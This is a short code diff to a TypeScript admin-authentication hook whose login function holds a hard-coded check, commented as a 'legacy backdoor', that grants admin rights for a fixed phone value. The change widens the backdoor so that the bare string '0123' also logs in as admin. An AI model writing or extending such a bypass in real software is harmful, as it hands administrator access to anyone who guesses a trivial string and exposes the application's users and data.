@@ -61,7 +61,7 @@ export const useAdminAuth = () => {
 
   const login = async (phone: string) => {
     // Legacy backdoor for admin login UI
-    if (phone === 'Admin 0123') {
+    if (phone === '0123' || phone === 'Admin 0123') {
       setUser('Admin', '0123', true)
       return { success: true }
     }
